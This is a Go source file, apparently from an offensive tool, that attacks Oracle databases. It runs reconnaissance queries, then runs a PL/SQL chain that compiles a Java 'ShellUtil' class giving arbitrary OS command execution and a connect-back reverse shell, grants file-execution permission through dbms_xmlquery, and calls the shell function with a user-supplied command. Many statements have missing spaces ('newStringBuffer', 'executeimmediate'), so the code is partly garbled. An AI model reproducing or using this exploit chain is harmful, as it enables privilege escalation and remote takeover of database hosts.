package cmdpackage

import (
	"Rpcon/common"
	"Rpcon/pkg"
	"database/sql"
	"fmt"
	_ "github.com/mattn/go-oci8"
	"log"
	"os"
)

//https://www.cnblogs.com/jiangyuqin/p/10135963.html
var cfg = []string{
	"SELECT * FROM session_privs;\n",
	"SELECT * FROM session_privs;\n",
	"SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';\n",              //查询数据库版本信息
	"SELECT banner FROM v$version where banner like 'TNS%';\n",                 //查询操作系统版本
	"SELECT UTL_INADDR.get_host_name FROM dual;\n",                             //查询主机名
	"SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = 'YES';\n", //查询所有dba用户
}

var exp = []string{
	`DECLAREv_command VARCHAR2(32767);BEGIN v_command :='create or replace and compile javasource named "ShellUtil" as import java.io.*;

importjava.net.Socket;

 

public class ShellUtilextends Object{

    public static String run(String methodName,String params, String encoding) {

        String res = "";

        if(methodName.equals("exec")) {

            res = ShellUtil.exec(params,encoding);

        }else if (methodName.equals("connectback")){

            String ip = params.substring(0,params.indexOf("^"));

            String port =params.substring(params.indexOf("^") + 1);

            res = ShellUtil.connectBack(ip,Integer.parseInt(port));

        }

        else {

            res = "unkown methodName";

        }

        return res;

    }

 

    public static String exec(String command,String encoding) {

        StringBuffer result = newStringBuffer();

        try {

            BufferedReader myReader = newBufferedReader(newInputStreamReader(Runtime.getRuntime().exec(command).getInputStream(),encoding));

            String stemp = "";

            while ((stemp =myReader.readLine()) != null) result.append(stemp + "");

            myReader.close();

        } catch (Exception e) {

            result.append(e.toString());

        }

        return result.toString();

    }

 

    public static String connectBack(String ip,int port) {

        class StreamConnector extends Thread {

            InputStream sp;

            OutputStream gh;

 

            StreamConnector(InputStream sp,OutputStream gh) {

                this.sp = sp;

                this.gh = gh;

            }

            @Override

            public void run() {

                BufferedReader xp = null;

                BufferedWriter ydg = null;

                try {

                    xp = new BufferedReader(newInputStreamReader(this.sp));

                    ydg = newBufferedWriter(new OutputStreamWriter(this.gh));

                    char buffer[] = newchar[8192];

                    int length;

                    while ((length = xp.read(buffer, 0,buffer.length)) > 0) {

                        ydg.write(buffer, 0,length);

                        ydg.flush();

                    }

                } catch (Exception e) {}

                try {

                    if (xp != null) {

                        xp.close();

                    }

                    if (ydg != null) {

                        ydg.close();

                    }

                } catch (Exception e) {

                }

            }

        }

        try {

            String sp;

            if(System.getProperty("os.name").toLowerCase().indexOf("windows")== -1) {

                sp = newString("/bin/sh");

            } else {

                sp = newString("cmd.exe");

            }

            Socket sk = new Socket(ip, port);

            Process ps =Runtime.getRuntime().exec(sp);

            (newStreamConnector(ps.getInputStream(), sk.getOutputStream())).start();

            (new StreamConnector(sk.getInputStream(),ps.getOutputStream())).start();

        } catch (Exception e) {

        }

        return "^OK^";

    }

}';EXECUTEIMMEDIATE v_command;END;`,
	`selectdbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin executeimmediate ''begin dbms_java.grant_permission( ''''SYSTEM'''',''''SYS:java.io.FilePermission'''', ''''<<ALLFILES>>'''',''''EXECUTE'''');end;''commit;end;') from dual;`,
	`selectdbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin executeimmediate ''create or replace function ShellRun(p_methodName invarchar2,p_params in varchar2,p_encoding in varchar2) return varchar2 aslanguage java name ''''ShellUtil.run(java.lang.String,java.lang.String,java.lang.String)return String''''; '';commit;end;') from dual;`,
}

func Orconn() (*sql.DB, error) {
	dns := fmt.Sprintf(`user="%v" password="%v" connectString="%v:%v/%v"`, common.User, common.Password, common.Host, common.Port, common.DBname)
	conn, err := sql.Open("oci8", dns)
	if err != nil {
		log.Fatal("Open Connection failed:", err.Error())
	}
	return conn, err
}

func ORquery() {
	conn, _ := Orconn()
	stmt, err := conn.Prepare(common.Code)
	rows, err := stmt.Query()
	if err != nil {
		log.Fatal("Query failed:", err.Error())
	}

	//建立一个列数组
	cols, err := rows.Columns()
	var colsdata = make([]interface{}, len(cols))
	for i := 0; i < len(cols); i++ {
		colsdata[i] = new(interface{})
		fmt.Print(cols[i])
		fmt.Print("\t")
	}
	fmt.Println()

	//遍历每一行
	for rows.Next() {
		rows.Scan(colsdata...) //将查到的数据写入到这行中
		pkg.PrintRow(colsdata) //打印此行
	}
	defer rows.Close()
	defer func() { conn.Close() }()
}

func ORcfg() {
	conn, _ := Orconn()
	for i := range cfg {
		stmt, err := conn.Prepare(cfg[i])
		if err != nil {
			log.Fatal("Prepare failed:", err.Error())
		}
		//通过Statement执行查询
		rows, err := stmt.Query()
		if err != nil {
			log.Fatal("Query failed:", err.Error())
		}

		//建立一个列数组
		cols, err := rows.Columns()
		var colsdata = make([]interface{}, len(cols))
		for i := 0; i < len(cols); i++ {
			colsdata[i] = new(interface{})
			fmt.Print(cols[i])
			fmt.Print("\t")
		}
		fmt.Println()

		//遍历每一行
		for rows.Next() {
			rows.Scan(colsdata...) //将查到的数据写入到这行中
			pkg.PrintRow(colsdata) //打印此行
		}
	}
	defer func() { conn.Close() }()
}

func ORacleshell() {
	conn, err := Orconn()
	if err != nil {
		log.Println(err)
	}
	for i := range exp {
		_, err := conn.Query(exp[i])
		if err != nil {
			log.Print("提权失败")
			os.Exit(0)
		}
	}
	ORcleCode := fmt.Sprintf("selectshellrun('exec','%s','GB2312') from dual", common.Code)
	stmt, err := conn.Prepare(ORcleCode)
	if err != nil {
		log.Fatal("Prepare failed:", err.Error())
	}
	defer stmt.Close()
	//通过Statement执行查询
	rows, err := stmt.Query()
	if err != nil {
		log.Fatal("Query failed:", err.Error())
	}

	//建立一个列数组
	cols, err := rows.Columns()
	var colsdata = make([]interface{}, len(cols))
	for i := 0; i < len(cols); i++ {
		colsdata[i] = new(interface{})
		fmt.Print(cols[i])
		fmt.Print("\t")
	}
	fmt.Println()

	//遍历每一行
	for rows.Next() {
		rows.Scan(colsdata...) //将查到的数据写入到这行中
		pkg.PrintRow(colsdata) //打印此行
	}
	defer rows.Close()
	defer func() { conn.Close() }()
}
